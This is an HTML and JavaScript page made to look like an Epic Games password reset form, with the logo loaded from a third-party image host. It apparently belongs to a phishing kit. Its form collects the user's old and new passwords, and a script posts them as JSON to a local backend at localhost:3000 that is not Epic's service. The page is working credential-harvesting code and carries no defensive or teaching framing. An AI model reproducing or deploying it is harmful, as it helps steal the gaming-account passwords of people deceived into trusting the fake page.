<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Epic Games Password Reset</title>
    <link rel="stylesheet" href="epicgames-html-password.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

        body {
            background-color: #181818;
            color: #fff;
            font-family: 'Roboto', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #242424;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
            width: 400px;
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 100px; /* Adjusted logo size */
            height: auto;
        }

        .MuiTypography-root.MuiTypography-body1.mui-o497ds {
            font-size: 22px;
            font-weight: 500;
            text-align: center;
            margin-bottom: 20px;
            letter-spacing: 0.5px;
            color: #f5f5f5;
        }

        .form-group {
            margin-bottom: 15px;
            position: relative;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #ddd;
            font-size: 14px;
            font-weight: bold;
        }

        input[type="password"] {
            width: 100%;
            padding: 8px;
            border: 1px solid #444;
            border-radius: 6px;
            background-color: #333;
            color: #fff;
            font-size: 14px;
            font-weight: bold;
            outline: none;
        }

        input[type="password"]:focus {
            border-color: #007bff;
            box-shadow: 0 0 5px #007bff;
        }

        .show-password {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 16px;
            color: #bbb;
        }

        .show-password:hover {
            color: #fff;
        }

        .requirements {
            margin-top: 15px;
            border: 1px solid #444;
            border-radius: 6px;
            padding: 15px;
            background-color: #2a2a2a;
            font-size: 14px;
        }

        .requirements ul {
            margin: 0;
            padding: 0 0 0 20px;
            list-style: disc;
        }

        .requirements li {
            margin-bottom: 10px;
            color: #bbb;
        }

        button {
            background: linear-gradient(90deg, #007bff, #0056b3);
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
            font-size: 14px;
            letter-spacing: 0.5px;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
        }

        button:active {
            transform: translateY(1px);
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.2);
        }

        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: #1a1a1a;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
            color: #ddd;
        }

        .logo img {
            display: block;
            margin: 0 auto 20px;
            width: 100px; /* Adjusted logo size */
        }

        .MuiTypography-root {
            text-align: center;
            font-size: 16px;
            margin-bottom: 20px;
            color: #ddd;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo Section -->
        <div class="logo">
            <img src="https://i.ibb.co/PTf4kjw/epic-games-logo.jpg" alt="Epic Games Logo">
        </div>

        <!-- Instructions -->
        <div class="MuiTypography-root MuiTypography-body1 mui-o497ds">
            Enter your new password for your Epic Games account.
        </div>

        <!-- Form Section -->
        <form id="resetPasswordForm">
            <!-- Old Password Section -->
            <div class="form-group">
                <label for="oldPassword">Old Password</label>
                <input type="password" id="oldPassword" name="oldPassword" placeholder="Enter your old password" required>
                <span class="show-password" onclick="togglePassword('oldPassword')">üëÅ</span>
            </div>

            <!-- New Password Section -->
            <div class="form-group">
                <label for="newPassword">New Password</label>
                <input type="password" id="newPassword" name="newPassword" placeholder="Enter your new password" required>
                <span class="show-password" onclick="togglePassword('newPassword')">üëÅ</span>
            </div>

            <!-- Password Requirements -->
            <div class="requirements">
                <strong>Password Requirements:</strong>
                <ul>
                    <li>Must not use any of your last 5 passwords</li>
                    <li>Must contain at least 7 characters</li>
                    <li>Must include at least 1 letter</li>
                    <li>Must include at least 1 number</li>
                    <li>Must not contain spaces</li>
                </ul>
            </div>

            <!-- Submit Button -->
            <button type="submit" class="submit-btn">Reset Password</button>
        </form>
    </div>

    <script>
        // Toggle Password Visibility
        function togglePassword(fieldId) {
            const field = document.getElementById(fieldId);
            field.type = field.type === 'password' ? 'text' : 'password';
        }

        // AJAX Form Submission
        document.getElementById('resetPasswordForm').addEventListener('submit', async function(event) {
            event.preventDefault();  // Prevent form from submitting the normal way

            const oldPassword = document.getElementById('oldPassword').value;
            const newPassword = document.getElementById('newPassword').value;

            // Send POST request to backend
            const response = await fetch('http://localhost:3000/reset-password', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    oldPassword: oldPassword,
                    newPassword: newPassword
                })
            });

            if (response.ok) {
                const data = await response.text();
                alert(data);  // Display the success message
            } else {
                alert('There was an error resetting the password.');
            }
        });
    </script>
</body>
</html>
